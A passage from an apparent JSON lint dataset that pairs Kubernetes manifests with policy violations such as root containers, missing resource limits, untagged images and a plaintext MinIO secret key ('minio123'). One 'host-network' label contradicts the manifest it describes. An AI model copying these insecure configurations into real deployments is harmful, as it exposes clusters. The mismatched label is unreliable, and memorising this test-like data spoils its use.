    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: bootiful-couchbase\n  labels:\n    name: bootiful-couchbase-pod\nspec:\n  template:\n    metadata:\n      name: bootiful-couchbase-pod\n    spec:\n      containers:\n      - name: bootiful-couchbase\n        image: arungupta/bootiful-couchbase\n        env:\n        - name: COUCHBASE_URI\n          value: couchbase-service\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "6933",
    "manifest_path": "data/manifests/the_stack_sample/sample_2529.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: bootiful-couchbase\n  labels:\n    name: bootiful-couchbase-pod\nspec:\n  template:\n    metadata:\n      name: bootiful-couchbase-pod\n    spec:\n      containers:\n      - name: bootiful-couchbase\n        image: arungupta/bootiful-couchbase\n        env:\n        - name: COUCHBASE_URI\n          value: couchbase-service\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"bootiful-couchbase\" is using an invalid container image, \"arungupta/bootiful-couchbase\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6934",
    "manifest_path": "data/manifests/the_stack_sample/sample_2529.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: bootiful-couchbase\n  labels:\n    name: bootiful-couchbase-pod\nspec:\n  template:\n    metadata:\n      name: bootiful-couchbase-pod\n    spec:\n      containers:\n      - name: bootiful-couchbase\n        image: arungupta/bootiful-couchbase\n        env:\n        - name: COUCHBASE_URI\n          value: couchbase-service\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"bootiful-couchbase\" does not have a read-only root file system"
  },
  {
    "id": "6935",
    "manifest_path": "data/manifests/the_stack_sample/sample_2529.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: bootiful-couchbase\n  labels:\n    name: bootiful-couchbase-pod\nspec:\n  template:\n    metadata:\n      name: bootiful-couchbase-pod\n    spec:\n      containers:\n      - name: bootiful-couchbase\n        image: arungupta/bootiful-couchbase\n        env:\n        - name: COUCHBASE_URI\n          value: couchbase-service\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"bootiful-couchbase\" is not set to runAsNonRoot"
  },
  {
    "id": "6936",
    "manifest_path": "data/manifests/the_stack_sample/sample_2529.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: bootiful-couchbase\n  labels:\n    name: bootiful-couchbase-pod\nspec:\n  template:\n    metadata:\n      name: bootiful-couchbase-pod\n    spec:\n      containers:\n      - name: bootiful-couchbase\n        image: arungupta/bootiful-couchbase\n        env:\n        - name: COUCHBASE_URI\n          value: couchbase-service\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"bootiful-couchbase\" has cpu request 0"
  },
  {
    "id": "6937",
    "manifest_path": "data/manifests/the_stack_sample/sample_2529.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: bootiful-couchbase\n  labels:\n    name: bootiful-couchbase-pod\nspec:\n  template:\n    metadata:\n      name: bootiful-couchbase-pod\n    spec:\n      containers:\n      - name: bootiful-couchbase\n        image: arungupta/bootiful-couchbase\n        env:\n        - name: COUCHBASE_URI\n          value: couchbase-service\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"bootiful-couchbase\" has memory limit 0"
  },
  {
    "id": "6938",
    "manifest_path": "data/manifests/the_stack_sample/sample_2530.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deployment-green\nspec:\n  selector:\n    matchLabels:\n      type: example_code\n      color: green\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        type: example_code\n        color: green\n    spec:\n      containers:\n      - name: echocolor\n        image: reselbob/echocolor:v0.1\n        ports:\n        - containerPort: 3000\n        env:\n        - name: COLOR_ECHO_COLOR\n          value: GREEN\n        - name: COLOR_ECHO_VERSION\n          value: V1\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "6939",
    "manifest_path": "data/manifests/the_stack_sample/sample_2530.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deployment-green\nspec:\n  selector:\n    matchLabels:\n      type: example_code\n      color: green\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        type: example_code\n        color: green\n    spec:\n      containers:\n      - name: echocolor\n        image: reselbob/echocolor:v0.1\n        ports:\n        - containerPort: 3000\n        env:\n        - name: COLOR_ECHO_COLOR\n          value: GREEN\n        - name: COLOR_ECHO_VERSION\n          value: V1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"echocolor\" does not have a read-only root file system"
  },
  {
    "id": "6940",
    "manifest_path": "data/manifests/the_stack_sample/sample_2530.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deployment-green\nspec:\n  selector:\n    matchLabels:\n      type: example_code\n      color: green\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        type: example_code\n        color: green\n    spec:\n      containers:\n      - name: echocolor\n        image: reselbob/echocolor:v0.1\n        ports:\n        - containerPort: 3000\n        env:\n        - name: COLOR_ECHO_COLOR\n          value: GREEN\n        - name: COLOR_ECHO_VERSION\n          value: V1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"echocolor\" is not set to runAsNonRoot"
  },
  {
    "id": "6941",
    "manifest_path": "data/manifests/the_stack_sample/sample_2530.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deployment-green\nspec:\n  selector:\n    matchLabels:\n      type: example_code\n      color: green\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        type: example_code\n        color: green\n    spec:\n      containers:\n      - name: echocolor\n        image: reselbob/echocolor:v0.1\n        ports:\n        - containerPort: 3000\n        env:\n        - name: COLOR_ECHO_COLOR\n          value: GREEN\n        - name: COLOR_ECHO_VERSION\n          value: V1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"echocolor\" has cpu request 0"
  },
  {
    "id": "6942",
    "manifest_path": "data/manifests/the_stack_sample/sample_2530.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deployment-green\nspec:\n  selector:\n    matchLabels:\n      type: example_code\n      color: green\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        type: example_code\n        color: green\n    spec:\n      containers:\n      - name: echocolor\n        image: reselbob/echocolor:v0.1\n        ports:\n        - containerPort: 3000\n        env:\n        - name: COLOR_ECHO_COLOR\n          value: GREEN\n        - name: COLOR_ECHO_VERSION\n          value: V1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"echocolor\" has memory limit 0"
  },
  {
    "id": "6943",
    "manifest_path": "data/manifests/the_stack_sample/sample_2532.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app.kubernetes.io/component: database-compactor\n    app.kubernetes.io/instance: thanos-compact\n    app.kubernetes.io/name: thanos-compact\n    app.kubernetes.io/version: v0.10.1\n  name: thanos-compact\n  namespace: thanos\nspec:\n  ports:\n  - name: http\n    port: 10902\n    targetPort: http\n  selector:\n    app.kubernetes.io/component: database-compactor\n    app.kubernetes.io/instance: thanos-compact\n    app.kubernetes.io/name: thanos-compact\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/component:database-compactor app.kubernetes.io/instance:thanos-compact app.kubernetes.io/name:thanos-compact])"
  },
  {
    "id": "6944",
    "manifest_path": "data/manifests/the_stack_sample/sample_2533.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8294\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6945",
    "manifest_path": "data/manifests/the_stack_sample/sample_2533.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8294\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "6946",
    "manifest_path": "data/manifests/the_stack_sample/sample_2533.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8294\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "6947",
    "manifest_path": "data/manifests/the_stack_sample/sample_2533.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8294\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "6948",
    "manifest_path": "data/manifests/the_stack_sample/sample_2533.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8294\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "6949",
    "manifest_path": "data/manifests/the_stack_sample/sample_2535.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: movies\nspec:\n  type: LoadBalancer\n  ports:\n  - name: movies-service\n    port: 9000\n    targetPort: 9000\n  - name: movies-hmr-service\n    port: 9001\n    targetPort: 9001\n  selector:\n    app: movies\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:movies])"
  },
  {
    "id": "6950",
    "manifest_path": "data/manifests/the_stack_sample/sample_2538.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: minio\n  labels:\n    app: minio\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: storage\n        hostPath:\n          path: /data/minio/\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2020-03-14T02-21-58Z\n        args:\n        - server\n        - http://hostname{1...4}/data/minio\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: storage\n          mountPath: /data/minio/\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable MINIO_SECRET_KEY in container \"minio\" found"
  },
  {
    "id": "6951",
    "manifest_path": "data/manifests/the_stack_sample/sample_2538.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: minio\n  labels:\n    app: minio\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: storage\n        hostPath:\n          path: /data/minio/\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2020-03-14T02-21-58Z\n        args:\n        - server\n        - http://hostname{1...4}/data/minio\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: storage\n          mountPath: /data/minio/\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "6952",
    "manifest_path": "data/manifests/the_stack_sample/sample_2538.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: minio\n  labels:\n    app: minio\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: storage\n        hostPath:\n          path: /data/minio/\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2020-03-14T02-21-58Z\n        args:\n        - server\n        - http://hostname{1...4}/data/minio\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: storage\n          mountPath: /data/minio/\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"minio\" does not have a read-only root file system"
  },
  {
    "id": "6953",
    "manifest_path": "data/manifests/the_stack_sample/sample_2538.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: minio\n  labels:\n    app: minio\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: storage\n        hostPath:\n          path: /data/minio/\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2020-03-14T02-21-58Z\n        args:\n        - server\n        - http://hostname{1...4}/data/minio\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: storage\n          mountPath: /data/minio/\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"minio\" is not set to runAsNonRoot"
  },
  {
    "id": "6954",
    "manifest_path": "data/manifests/the_stack_sample/sample_2538.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: minio\n  labels:\n    app: minio\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: storage\n        hostPath:\n          path: /data/minio/\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2020-03-14T02-21-58Z\n        args:\n        - server\n        - http://hostname{1...4}/data/minio\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: storage\n          mountPath: /data/minio/\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"minio\" has cpu request 0"
  },
  {
    "id": "6955",
    "manifest_path": "data/manifests/the_stack_sample/sample_2538.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: minio\n  labels:\n    app: minio\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: storage\n        hostPath:\n          path: /data/minio/\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2020-03-14T02-21-58Z\n        args:\n        - server\n        - http://hostname{1...4}/data/minio\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: storage\n          mountPath: /data/minio/\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"minio\" has memory limit 0"
  },
  {
    "id": "6956",
    "manifest_path": "data/manifests/the_stack_sample/sample_2539.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: core-agents\n  namespace: mayastor\n  labels:\n    app: core-agents\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: core-agents\n  template:\n    metadata:\n      labels:\n        app: core-agents\n    spec:\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz nats 4222; do echo \"Waiting for nats...\";\n          sleep 1; done;\n        image: busybox:latest\n        name: nats-probe\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz mayastor-etcd-client 2379; do echo \"Waiting\n          for etcd...\"; sleep 1; done;\n        image: busybox:latest\n        name: etcd-probe\n      containers:\n      - name: core\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 32Mi\n          requests:\n            cpu: 500m\n            memory: 16Mi\n        image: mayadata/mcp-core:v1.0.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - -smayastor-etcd-client\n        - -nnats\n        - --request-timeout=5s\n        - --cache-period=30s\n        env:\n        - name: RUST_LOG\n          value: info\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"etcd-probe\" is using an invalid container image, \"busybox:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6957",
    "manifest_path": "data/manifests/the_stack_sample/sample_2539.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: core-agents\n  namespace: mayastor\n  labels:\n    app: core-agents\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: core-agents\n  template:\n    metadata:\n      labels:\n        app: core-agents\n    spec:\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz nats 4222; do echo \"Waiting for nats...\";\n          sleep 1; done;\n        image: busybox:latest\n        name: nats-probe\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz mayastor-etcd-client 2379; do echo \"Waiting\n          for etcd...\"; sleep 1; done;\n        image: busybox:latest\n        name: etcd-probe\n      containers:\n      - name: core\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 32Mi\n          requests:\n            cpu: 500m\n            memory: 16Mi\n        image: mayadata/mcp-core:v1.0.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - -smayastor-etcd-client\n        - -nnats\n        - --request-timeout=5s\n        - --cache-period=30s\n        env:\n        - name: RUST_LOG\n          value: info\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nats-probe\" is using an invalid container image, \"busybox:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6958",
    "manifest_path": "data/manifests/the_stack_sample/sample_2539.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: core-agents\n  namespace: mayastor\n  labels:\n    app: core-agents\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: core-agents\n  template:\n    metadata:\n      labels:\n        app: core-agents\n    spec:\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz nats 4222; do echo \"Waiting for nats...\";\n          sleep 1; done;\n        image: busybox:latest\n        name: nats-probe\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz mayastor-etcd-client 2379; do echo \"Waiting\n          for etcd...\"; sleep 1; done;\n        image: busybox:latest\n        name: etcd-probe\n      containers:\n      - name: core\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 32Mi\n          requests:\n            cpu: 500m\n            memory: 16Mi\n        image: mayadata/mcp-core:v1.0.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - -smayastor-etcd-client\n        - -nnats\n        - --request-timeout=5s\n        - --cache-period=30s\n        env:\n        - name: RUST_LOG\n          value: info\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"core\" does not have a read-only root file system"
  },
  {
    "id": "6959",
    "manifest_path": "data/manifests/the_stack_sample/sample_2539.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: core-agents\n  namespace: mayastor\n  labels:\n    app: core-agents\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: core-agents\n  template:\n    metadata:\n      labels:\n        app: core-agents\n    spec:\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz nats 4222; do echo \"Waiting for nats...\";\n          sleep 1; done;\n        image: busybox:latest\n        name: nats-probe\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz mayastor-etcd-client 2379; do echo \"Waiting\n          for etcd...\"; sleep 1; done;\n        image: busybox:latest\n        name: etcd-probe\n      containers:\n      - name: core\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 32Mi\n          requests:\n            cpu: 500m\n            memory: 16Mi\n        image: mayadata/mcp-core:v1.0.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - -smayastor-etcd-client\n        - -nnats\n        - --request-timeout=5s\n        - --cache-period=30s\n        env:\n        - name: RUST_LOG\n          value: info\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"etcd-probe\" does not have a read-only root file system"
  },
  {
    "id": "6960",
    "manifest_path": "data/manifests/the_stack_sample/sample_2539.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: core-agents\n  namespace: mayastor\n  labels:\n    app: core-agents\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: core-agents\n  template:\n    metadata:\n      labels:\n        app: core-agents\n    spec:\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz nats 4222; do echo \"Waiting for nats...\";\n          sleep 1; done;\n        image: busybox:latest\n        name: nats-probe\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz mayastor-etcd-client 2379; do echo \"Waiting\n          for etcd...\"; sleep 1; done;\n        image: busybox:latest\n        name: etcd-probe\n      containers:\n      - name: core\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 32Mi\n          requests:\n            cpu: 500m\n            memory: 16Mi\n        image: mayadata/mcp-core:v1.0.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - -smayastor-etcd-client\n        - -nnats\n        - --request-timeout=5s\n        - --cache-period=30s\n        env:\n        - name: RUST_LOG\n          value: info\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nats-probe\" does not have a read-only root file system"
  },
  {
    "id": "6961",
    "manifest_path": "data/manifests/the_stack_sample/sample_2539.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: core-agents\n  namespace: mayastor\n  labels:\n    app: core-agents\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: core-agents\n  template:\n    metadata:\n      labels:\n        app: core-agents\n    spec:\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz nats 4222; do echo \"Waiting for nats...\";\n          sleep 1; done;\n        image: busybox:latest\n        name: nats-probe\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz mayastor-etcd-client 2379; do echo \"Waiting\n          for etcd...\"; sleep 1; done;\n        image: busybox:latest\n        name: etcd-probe\n      containers:\n      - name: core\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 32Mi\n          requests:\n            cpu: 500m\n            memory: 16Mi\n        image: mayadata/mcp-core:v1.0.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - -smayastor-etcd-client\n        - -nnats\n        - --request-timeout=5s\n        - --cache-period=30s\n        env:\n        - name: RUST_LOG\n          value: info\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"core\" is not set to runAsNonRoot"
  },
  {
    "id": "6962",
    "manifest_path": "data/manifests/the_stack_sample/sample_2539.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: core-agents\n  namespace: mayastor\n  labels:\n    app: core-agents\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: core-agents\n  template:\n    metadata:\n      labels:\n        app: core-agents\n    spec:\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz nats 4222; do echo \"Waiting for nats...\";\n          sleep 1; done;\n        image: busybox:latest\n        name: nats-probe\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz mayastor-etcd-client 2379; do echo \"Waiting\n          for etcd...\"; sleep 1; done;\n        image: busybox:latest\n        name: etcd-probe\n      containers:\n      - name: core\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 32Mi\n          requests:\n            cpu: 500m\n            memory: 16Mi\n        image: mayadata/mcp-core:v1.0.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - -smayastor-etcd-client\n        - -nnats\n        - --request-timeout=5s\n        - --cache-period=30s\n        env:\n        - name: RUST_LOG\n          value: info\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"etcd-probe\" is not set to runAsNonRoot"
  },
  {
    "id": "6963",
    "manifest_path": "data/manifests/the_stack_sample/sample_2539.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: core-agents\n  namespace: mayastor\n  labels:\n    app: core-agents\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: core-agents\n  template:\n    metadata:\n      labels:\n        app: core-agents\n    spec:\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz nats 4222; do echo \"Waiting for nats...\";\n          sleep 1; done;\n        image: busybox:latest\n        name: nats-probe\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz mayastor-etcd-client 2379; do echo \"Waiting\n          for etcd...\"; sleep 1; done;\n        image: busybox:latest\n        name: etcd-probe\n      containers:\n      - name: core\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 32Mi\n          requests:\n            cpu: 500m\n            memory: 16Mi\n        image: mayadata/mcp-core:v1.0.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - -smayastor-etcd-client\n        - -nnats\n        - --request-timeout=5s\n        - --cache-period=30s\n        env:\n        - name: RUST_LOG\n          value: info\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nats-probe\" is not set to runAsNonRoot"
  },
  {
    "id": "6964",
    "manifest_path": "data/manifests/the_stack_sample/sample_2539.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: core-agents\n  namespace: mayastor\n  labels:\n    app: core-agents\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: core-agents\n  template:\n    metadata:\n      labels:\n        app: core-agents\n    spec:\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz nats 4222; do echo \"Waiting for nats...\";\n          sleep 1; done;\n        image: busybox:latest\n        name: nats-probe\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz mayastor-etcd-client 2379; do echo \"Waiting\n          for etcd...\"; sleep 1; done;\n        image: busybox:latest\n        name: etcd-probe\n      containers:\n      - name: core\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 32Mi\n          requests:\n            cpu: 500m\n            memory: 16Mi\n        image: mayadata/mcp-core:v1.0.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - -smayastor-etcd-client\n        - -nnats\n        - --request-timeout=5s\n        - --cache-period=30s\n        env:\n        - name: RUST_LOG\n          value: info\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"etcd-probe\" has cpu request 0"
  },
  {
    "id": "6965",
    "manifest_path": "data/manifests/the_stack_sample/sample_2539.yaml",
